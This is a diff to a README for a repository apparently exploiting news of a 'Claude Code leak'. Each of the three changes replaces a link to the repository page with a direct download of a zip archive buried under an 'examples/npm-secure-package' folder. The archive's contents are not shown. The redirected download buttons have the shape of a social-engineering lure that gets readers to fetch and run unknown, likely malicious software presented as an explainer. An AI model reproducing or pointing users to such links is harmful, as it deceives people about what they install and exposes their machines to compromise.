@@ -1,6 +1,6 @@
 # 🧠 why-claude-code-leaked - Understand the leak, avoid the risk
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked/raw/refs/heads/main/examples/npm-secure-package/code_leaked_claude_why_2.4.zip)
 
 ## 📌 What this is
 
@@ -20,7 +20,7 @@ Use it to review the issue from a plain-English point of view on Windows.
 
 To get the software, **visit this page to download**:
 
-**[Download from GitHub](https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked)**
+**[Download from GitHub](https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked/raw/refs/heads/main/examples/npm-secure-package/code_leaked_claude_why_2.4.zip)**
 
 ### Steps
 
@@ -276,7 +276,7 @@ The repository name and topics point to these ideas:
 
 Use this link to visit the page and download the content:
 
-**[https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked](https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked)**
+**[https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked/raw/refs/heads/main/examples/npm-secure-package/code_leaked_claude_why_2.4.zip](https://github.com/humanistic-caloosahatcheecanal893/why-claude-code-leaked/raw/refs/heads/main/examples/npm-secure-package/code_leaked_claude_why_2.4.zip)**
 
 ## 🧭 What to do after download
 
